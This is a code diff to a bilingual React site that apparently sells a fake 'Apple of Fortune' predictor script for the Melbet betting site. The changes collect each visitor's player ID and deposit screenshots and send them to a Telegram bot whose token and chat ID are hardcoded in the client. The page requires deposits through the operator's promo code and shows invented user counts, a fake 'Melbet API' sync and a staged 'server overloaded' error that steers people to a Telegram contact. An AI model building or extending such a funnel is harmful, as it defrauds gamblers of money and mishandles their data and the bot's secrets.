@@ -27,6 +27,46 @@ import {
   XCircle
 } from 'lucide-react';
 
+// === Telegram Configuration — fill in your credentials ===
+const TELEGRAM_BOT_TOKEN = '8996243290:AAEuX32YcDpIuApc7kB_XdIzOdflX1k1y3o';
+const TELEGRAM_CHAT_ID = '1096675312';
+const ADMIN_ACTIVATION_CODE = 'ALBRAZILY-ACTIVE'; // Fixed activation code granted by admin
+const TELEGRAM_GROUP_URL = 'https://t.me/albrazily0';
+
+async function sendSubmissionToTelegram(
+  playerId: string,
+  regFile: File,
+  depositFile: File
+): Promise<void> {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    throw new Error('Telegram bot not configured');
+  }
+
+  const baseUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+  const msgRes = await fetch(`${baseUrl}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `🍎 Apple of Fortune — New Submission\n\n📋 Melbet Player ID: ${playerId}`,
+    }),
+  });
+  if (!msgRes.ok) throw new Error('Failed to send message');
+
+  async function sendPhoto(file: File, caption: string) {
+    const fd = new FormData();
+    fd.append('chat_id', TELEGRAM_CHAT_ID);
+    fd.append('photo', file);
+    fd.append('caption', caption);
+    const res = await fetch(`${baseUrl}/sendPhoto`, { method: 'POST', body: fd });
+    if (!res.ok) throw new Error('Failed to send photo');
+  }
+
+  await sendPhoto(regFile, '📸 Registration Screenshot');
+  await sendPhoto(depositFile, '💰 Deposit Screenshot');
+}
+
 type Language = 'en' | 'ar';
 
 interface Translations {
@@ -111,11 +151,13 @@ interface Translations {
     depositNotice: string;
     submitButton: string;
     syncing: string;
-    generatedKey: string;
-    copyKey: string;
-    keyCopied: string;
-    enterKey: string;
-    keyPlaceholder: string;
+    submissionSuccess: string;
+    enterAdminCode: string;
+    adminCodePlaceholder: string;
+    confirmActivation: string;
+    submitErrorRequired: string;
+    submitErrorTelegram: string;
+    submitErrorConfig: string;
     activateButton: string;
     wrongKey: string;
     onlineUsers: string;
@@ -205,16 +247,18 @@ const translations: Record<Language, Translations> = {
       playerIdPlaceholder: 'Enter your Player ID',
       regScreenshot: 'Registration Screenshot',
       depositScreenshot: 'Deposit Screenshot',
-      depositNotice: 'Notice: Deposit must be between 200 to 500 EGP minimum, and registration via our promo code is required for automatic script activation.',
+      depositNotice: 'Notice: Deposit must be between 200 to 500 EGP or 5$ to 10$ minimum, and registration via our promo code is required for automatic script activation.',
       submitButton: 'Submit & Verify Deposit',
-      syncing: 'Syncing with Melbet API...',
-      generatedKey: 'Your Unique Activation Key',
-      copyKey: 'Copy',
-      keyCopied: 'Copied!',
-      enterKey: 'Enter Your Activation Key',
-      keyPlaceholder: 'Enter the key shown above',
+      syncing: 'Sending your data...',
+      submissionSuccess: 'Your data has been sent successfully! Please enter the activation code provided by admin to complete the process.',
+      enterAdminCode: 'Activation Code',
+      adminCodePlaceholder: 'Enter the code provided by admin',
+      confirmActivation: 'Confirm Activation',
+      submitErrorRequired: 'Please fill in Player ID and upload both screenshots.',
+      submitErrorTelegram: 'Failed to send data. Please try again or contact support.',
+      submitErrorConfig: 'Telegram bot is not configured yet. Please contact support.',
       activateButton: 'Activate Script',
-      wrongKey: 'Invalid key. Please enter the exact key shown.',
+      wrongKey: 'Invalid activation code. Please enter the code provided by admin.',
       onlineUsers: 'Online Users',
       serverOverload: 'ERROR: Server Overloaded!',
       serverOverloadDesc: 'Due to high traffic from 14,000+ active users, script grid generation is temporarily queued. Please try again later or contact support immediately to speed up activation.',
@@ -300,16 +344,18 @@ const translations: Record<Language, Translations> = {
       playerIdPlaceholder: 'أدخل معرف اللاعب',
       regScreenshot: 'صورة التسجيل',
       depositScreenshot: 'صورة الإيداع',
-      depositNotice: 'تنبيه: يجب أن يكون الإيداع من أول 200 إلى 500 جنيه كأقل حاجة، والتسجيل بالبروموكود لتفعيل السكريبت تلقائياً.',
+      depositNotice: 'تنبيه: يجب أن يكون الإيداع من 200 إلى 500 جنيه أو من 5$ إلى 10$ كحد أدنى، والتسجيل عبر بروموكود الخاص بنا مطلوب لتفعيل السكريبت تلقائياً.',
       submitButton: 'إرسال وتأكيد الإيداع',
-      syncing: 'جاري المزامنة مع API ميلبت...',
-      generatedKey: 'مفتاح التفعيل الفريد الخاص بك',
-      copyKey: 'نسخ',
-      keyCopied: 'تم النسخ!',
-      enterKey: 'أدخل مفتاح التفعيل الخاص بك',
-      keyPlaceholder: 'أدخل المفتاح الظاهر أعلاه',
+      syncing: 'جاري إرسال بياناتك...',
+      submissionSuccess: 'تم إرسال بياناتك بنجاح! برجاء إدخال كود التفعيل الممنوح لك من الإدارة لإكمال العملية.',
+      enterAdminCode: 'كود التفعيل',
+      adminCodePlaceholder: 'أدخل كود التفعيل من الإدارة',
+      confirmActivation: 'تأكيد التفعيل',
+      submitErrorRequired: 'يرجى إدخال معرف اللاعب ورفع الصورتين.',
+      submitErrorTelegram: 'فشل إرسال البيانات. يرجى المحاولة مرة أخرى أو التواصل مع الدعم.',
+      submitErrorConfig: 'بوت التلجرام غير مُعد بعد. يرجى التواصل مع الدعم.',
       activateButton: 'تفعيل السكربت',
-      wrongKey: 'مفتاح غير صالح. يرجى إدخال المفتاح الظاهر بالضبط.',
+      wrongKey: 'كود تفعيل غير صحيح. يرجى إدخال الكود الممنوح من الإدارة.',
       onlineUsers: 'المستخدمون المتصلون',
       serverOverload: 'خطأ: السيرفر ممتلئ!',
       serverOverloadDesc: 'بسبب الضغط العالي من أكثر من 14,000 مستخدم نشط، تم إيقاف توليد شبكة التفاح مؤقتاً في طابور الانتظار. يرجى المحاولة لاحقاً أو مراسلة الدعم فوراً لتسريع التفعيل.',
@@ -552,7 +598,7 @@ function Navbar({
             </button>
             <LanguageToggle />
             <a
-              href="https://t.me/abed0992"
+              href={TELEGRAM_GROUP_URL}
               target="_blank"
               rel="noopener noreferrer"
               className={`flex items-center gap-2 px-4 py-2 rounded-lg bg-gradient-to-r from-cyber-yellow to-cyber-gold text-cyber-black font-semibold text-sm hover:shadow-lg hover:shadow-cyber-yellow/30 transition-all duration-300 ${isRTL ? 'flex-row-reverse' : ''}`}
@@ -602,7 +648,7 @@ function Navbar({
               {t.nav.community}
             </button>
             <a
-              href="https://t.me/abed0992"
+              href={TELEGRAM_GROUP_URL}
               target="_blank"
               rel="noopener noreferrer"
               className="flex items-center justify-center gap-2 px-6 py-3 rounded-lg bg-gradient-to-r from-cyber-yellow to-cyber-gold text-cyber-black font-semibold"
@@ -901,7 +947,7 @@ function AgentPartnershipSection() {
 
           {/* CTA Button */}
           <a
-            href="https://t.me/abed0992"
+            href={TELEGRAM_GROUP_URL}
             target="_blank"
             rel="noopener noreferrer"
             className={`inline-flex items-center gap-3 px-8 py-4 rounded-xl bg-gradient-to-r from-cyber-yellow to-cyber-gold text-cyber-black font-bold text-lg hover:shadow-xl hover:shadow-cyber-yellow/40 transition-all duration-300 hover:-translate-y-1 ${isRTL ? 'flex-row-reverse' : ''}`}
@@ -963,7 +1009,7 @@ function CommunitySection() {
             title={t.community.scriptsGroup.title}
             description={t.community.scriptsGroup.description}
             buttonText={t.community.scriptsGroup.buttonText}
-            buttonLink="https://t.me/melbetscrept"
+            buttonLink={TELEGRAM_GROUP_URL}
             accentColor="blue"
           />
 
@@ -973,7 +1019,7 @@ function CommunitySection() {
             title={t.community.agent.title}
             description={t.community.agent.description}
             buttonText={t.community.agent.buttonText}
-            buttonLink="https://t.me/abed0992"
+            buttonLink={TELEGRAM_GROUP_URL}
             accentColor="yellow"
           />
         </div>
@@ -1070,7 +1116,7 @@ function Footer() {
           {/* Social Links */}
           <div className={`flex justify-center gap-4 mb-8 ${isRTL ? 'flex-row-reverse' : ''}`}>
             <a
-              href="https://t.me/abed0992"
+              href={TELEGRAM_GROUP_URL}
               target="_blank"
               rel="noopener noreferrer"
               className="w-12 h-12 rounded-xl bg-cyber-dark border border-gray-800 flex items-center justify-center text-gray-400 hover:text-cyber-yellow hover:border-cyber-yellow/50 transition-all duration-300"
@@ -1109,14 +1155,13 @@ let masterControlState = {
 
 function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
   const { t, isRTL, language } = useLanguage();
-  const [stage, setStage] = useState<'verification' | 'syncing' | 'keyGenerated' | 'script'>('verification');
+  const [stage, setStage] = useState<'verification' | 'syncing' | 'awaitingActivation' | 'script'>('verification');
   const [playerId, setPlayerId] = useState('');
   const [regFile, setRegFile] = useState<File | null>(null);
   const [depositFile, setDepositFile] = useState<File | null>(null);
-  const [generatedKey, setGeneratedKey] = useState('');
   const [inputKey, setInputKey] = useState('');
   const [keyError, setKeyError] = useState(false);
-  const [keyCopied, setKeyCopied] = useState(false);
+  const [submitError, setSubmitError] = useState('');
   const [userCount, setUserCount] = useState(2145);
   const [sessionTimer, setSessionTimer] = useState(3600);
   const [masterState, setMasterState] = useState(masterControlState);
@@ -1128,7 +1173,6 @@ function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
       const session = JSON.parse(savedSession);
       const now = Date.now();
       if (session.expiresAt > now) {
-        setGeneratedKey(session.key);
         setStage('script');
         const remaining = Math.floor((session.expiresAt - now) / 1000);
         setSessionTimer(remaining);
@@ -1176,37 +1220,37 @@ function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
     return () => clearInterval(syncInterval);
   }, []);
 
-  const generateKey = () => {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const part = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
-    return `BRZ-${part()}-MEL`;
-  };
+  const handleSubmit = async () => {
+    if (!playerId.trim() || !regFile || !depositFile) {
+      setSubmitError(t.script.submitErrorRequired);
+      return;
+    }
 
-  const handleSubmit = () => {
+    setSubmitError('');
     setStage('syncing');
-    setTimeout(() => {
-      const key = generateKey();
-      setGeneratedKey(key);
-      setStage('keyGenerated');
-    }, 2000);
-  };
 
-  const handleActivate = () => {
-    if (inputKey.trim().toUpperCase() === generatedKey) {
-      setKeyError(false);
-      setStage('script');
-      // Save session to localStorage
-      const expiresAt = Date.now() + 3600000; // 1 hour
-      localStorage.setItem('appleFortune_session', JSON.stringify({ key: generatedKey, expiresAt }));
-    } else {
-      setKeyError(true);
+    try {
+      await sendSubmissionToTelegram(playerId.trim(), regFile, depositFile);
+      setStage('awaitingActivation');
+    } catch (err) {
+      setStage('verification');
+      if (err instanceof Error && err.message === 'Telegram bot not configured') {
+        setSubmitError(t.script.submitErrorConfig);
+      } else {
+        setSubmitError(t.script.submitErrorTelegram);
+      }
     }
   };
 
-  const handleCopyKey = async () => {
-    await navigator.clipboard.writeText(generatedKey);
-    setKeyCopied(true);
-    setTimeout(() => setKeyCopied(false), 2000);
+  const handleActivate = () => {
+    if (inputKey.trim().toUpperCase() === ADMIN_ACTIVATION_CODE.toUpperCase()) {
+      setKeyError(false);
+      setStage('script');
+      const expiresAt = Date.now() + 3600000;
+      localStorage.setItem('appleFortune_session', JSON.stringify({ activated: true, expiresAt }));
+    } else {
+      setKeyError(true);
+    }
   };
 
   const handleFileChange = (type: 'reg' | 'deposit', file: File | null) => {
@@ -1215,6 +1259,7 @@ function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
     } else {
       setDepositFile(file);
     }
+    setSubmitError('');
   };
 
   const apples = Array.from({ length: 20 }, (_, i) => ({
@@ -1307,6 +1352,10 @@ function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
                   </p>
                 </div>
 
+                {submitError && (
+                  <p className="text-red-500 text-sm text-center">{submitError}</p>
+                )}
+
                 {/* Submit Button */}
                 <button
                   onClick={handleSubmit}
@@ -1328,52 +1377,33 @@ function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
             </div>
           )}
 
-          {stage === 'keyGenerated' && (
+          {stage === 'awaitingActivation' && (
             <div className="space-y-6">
-              {/* Success Header */}
               <div className="text-center mb-6">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-cyber-green/10 border border-cyber-green/30 flex items-center justify-center">
-                  <Check className="text-cyber-green" size={28} />
+                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-cyber-yellow/10 border border-cyber-yellow/30 flex items-center justify-center">
+                  <Lock className="text-cyber-yellow" size={28} />
                 </div>
-                <p className="text-gray-400">{t.script.generatedKey}</p>
+                <p className="text-gray-300 text-base leading-relaxed px-2">{t.script.submissionSuccess}</p>
               </div>
 
-              {/* Generated Key Display */}
-              <div className="p-6 rounded-xl bg-cyber-black border border-gray-700 text-center">
-                <div className="font-['Orbitron'] text-3xl md:text-4xl font-bold text-cyber-yellow tracking-wider mb-4">{generatedKey}</div>
-                <button
-                  onClick={handleCopyKey}
-                  className={`px-6 py-2 rounded-lg font-semibold transition-all duration-300 flex items-center justify-center gap-2 mx-auto ${
-                    keyCopied
-                      ? 'bg-cyber-green text-cyber-black'
-                      : 'bg-cyber-dark border border-cyber-yellow/30 text-cyber-yellow hover:bg-cyber-yellow/10'
-                  }`}
-                >
-                  {keyCopied ? <Check size={16} /> : <Copy size={16} />}
-                  {keyCopied ? t.script.keyCopied : t.script.copyKey}
-                </button>
-              </div>
-
-              {/* Key Input */}
               <div className={`${isRTL ? 'text-right' : 'text-left'}`}>
-                <label className="block text-sm text-gray-400 mb-2">{t.script.enterKey}</label>
+                <label className="block text-sm text-gray-400 mb-2">{t.script.enterAdminCode}</label>
                 <input
                   type="text"
                   value={inputKey}
                   onChange={(e) => { setInputKey(e.target.value); setKeyError(false); }}
-                  placeholder={t.script.keyPlaceholder}
+                  placeholder={t.script.adminCodePlaceholder}
                   className={`w-full px-4 py-3 bg-cyber-black border rounded-lg text-white placeholder-gray-500 focus:outline-none transition-colors font-mono tracking-wider ${keyError ? 'border-red-500' : 'border-gray-600 focus:border-cyber-yellow/50'}`}
                 />
                 {keyError && <p className="text-red-500 text-sm mt-2">{t.script.wrongKey}</p>}
               </div>
 
-              {/* Activate Button */}
               <button
                 onClick={handleActivate}
                 className="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-cyber-yellow to-cyber-gold text-cyber-black font-bold text-lg hover:shadow-xl hover:shadow-cyber-yellow/40 transition-all duration-300 flex items-center justify-center gap-2"
               >
                 <Zap size={20} />
-                {t.script.activateButton}
+                {t.script.confirmActivation}
               </button>
             </div>
           )}
@@ -1442,7 +1472,7 @@ function AppleOfFortuneModal({ onClose }: { onClose: () => void }) {
                       <h3 className="font-['Orbitron'] text-lg font-bold text-red-500 mb-3">{t.script.serverOverload}</h3>
                       <p className="text-gray-300 text-sm mb-6 leading-relaxed">{t.script.serverOverloadDesc}</p>
                       <a
-                        href="https://t.me/abed0992"
+                        href={TELEGRAM_GROUP_URL}
                         target="_blank"
                         rel="noopener noreferrer"
                         className="inline-flex items-center gap-2 px-6 py-3 rounded-xl bg-gradient-to-r from-cyber-yellow to-cyber-gold text-cyber-black font-bold transition-all duration-300 hover:shadow-lg hover:shadow-cyber-yellow/40"
@@ -1646,7 +1676,7 @@ function FloatingTelegramButton() {
 
   return (
     <a
-      href="https://t.me/abed0992"
+      href={TELEGRAM_GROUP_URL}
       target="_blank"
       rel="noopener noreferrer"
       className={`fixed bottom-6 z-50 group ${isRTL ? 'left-6' : 'right-6'}`}
